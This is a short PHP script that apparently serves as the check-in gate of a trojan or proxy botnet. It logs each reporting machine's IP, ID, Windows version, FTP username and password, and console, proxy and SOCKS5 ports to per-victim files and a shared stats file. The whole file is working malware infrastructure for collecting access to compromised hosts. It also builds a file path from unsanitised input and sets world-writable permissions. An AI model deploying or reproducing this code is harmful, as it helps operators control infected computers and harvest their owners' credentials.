<?php
$date=date("[D|d/m/Y|H:i]");
$ip2=getenv("Remote_addr");
$usbd = "users/$name.dat";
     	$del=fopen("$usbd","w");
	    fclose($del);
     $fp=fopen("$usbd","w");
     chmod("$usbd",0777);
fputs($fp,"$date\t#$uid#\t$ip2#\t$name#\t$winver#\t$ftpport#\t$ftpuser#\t$ftppass#\t$consoleport#\t$proxyport#\t$socks5port#$rest#\n");
     fclose($fp);
$fp1=fopen("stat.dat","a");
fputs($fp1,"$date\t#$uid#\t$ip2#\t$name#\t$winver#\t$ftpport#\t$ftpuser#\t$ftppass#\t$consoleport#\t$proxyport#\t$socks5port#$rest#\n");
fclose($fp1);
?> 